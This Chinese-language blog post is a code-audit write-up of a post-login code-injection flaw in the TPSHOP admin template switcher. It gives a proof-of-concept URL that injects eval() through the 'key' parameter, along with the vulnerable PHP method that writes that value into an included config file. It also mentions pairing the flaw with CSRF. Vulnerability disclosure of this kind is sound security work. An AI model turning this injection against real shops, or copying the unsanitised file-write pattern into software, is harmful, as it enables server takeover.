---
title: TPSHOP-GETSHELL
date: 2017-11-24 13:59:47
tags:
	- PHP
	- 代码审计
categories: 渗透
---

萌新最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我这萌新找了个后台getshell，调了很久，终于调通了POC

<!-- more -->

萌新最近看大佬在审计TPSHOP，心痒痒也不知羞耻地跟着看代码，还真给我这萌新找了个后台getshell，调了很久，终于调通了POC

http://xxx/index.php/Admin/template/changeTemplate/key/'.eval('echo 123;').'/t/pc

利用条件是需要登陆进入后台，触发点在后台的模板修改处，点击“启用”按钮就可以发送一个GET请求，把GET请求中的KEY参数改为'.eval('echo 123;').' 即可。。
或者是直接登陆进入后台，直接浏览器请求POC也行的

漏洞触发点在  application/admin/controller/Template.php 中的changeTemplate方法中

```php
public function changeTemplate(){        
        
        $t = I('t','pc'); // pc or  mobile        
        $m = ($t == 'pc') ? 'home' : 'mobile';
        $key = $this->request->param('key');
        //$default_theme = tpCache("hidden.{$t}_default_theme"); // 获取原来的配置                
        //tpCache("hidden.{$t}_default_theme",$_GET['key']);
        //tpCache('hidden',array("{$t}_default_theme"=>$_GET['key']));                         
        // 修改文件配置  
         if(!is_writeable(APP_PATH."$m/html.php"))
            return "文件/".APP_PATH."$m/html.php不可写,不能启用魔板,请修改权限!!!";
         
                $config_html ="<?php
return [
            'template'               => [
            // 模板引擎类型 支持 php think 支持扩展
            'type'         => 'Think',
            // 模板路径
            'view_path'    => './template/$t/$key/',
            // 模板后缀
            'view_suffix'  => 'html',
            // 模板文件名分隔符
            'view_depr'    => DS,
            // 模板引擎普通标签开始标记
            'tpl_begin'    => '{',
            // 模板引擎普通标签结束标记
            'tpl_end'      => '}',
            // 标签库标签开始标记
            'taglib_begin' => '<',
            // 标签库标签结束标记
            'taglib_end'   => '>',
            //模板文件名
            'default_theme'     => '$key',
        ],
        'view_replace_str'  =>  [
            '__PUBLIC__'=>'/public',
            '__STATIC__' => '/template/$t/$key/static',
            '__ROOT__'=>''
        ]
    ];
?>";
         file_put_contents(APP_PATH."/$m/html.php", $config_html);
        delFile('./runtime');
        $this->success("操作成功!!!",U('admin/template/templateList',array('t'=>$t)));      
    }
```

其中$t 和 $key可控，咱们只需要让$key = '.eval('echo 123;').'即可
但是直接访问html.php是403的
然后由于config.php包含了html.php，index.php包含了config.php，所以直接访问修改后直接访问index.php即可getshell

这个洞是后台getshell，有点鸡肋，如果配合CSRF的话那么威力还是有的（萌新也只能挖个后台getshell了）

感谢@碧波 大神帮忙调通了POC。。


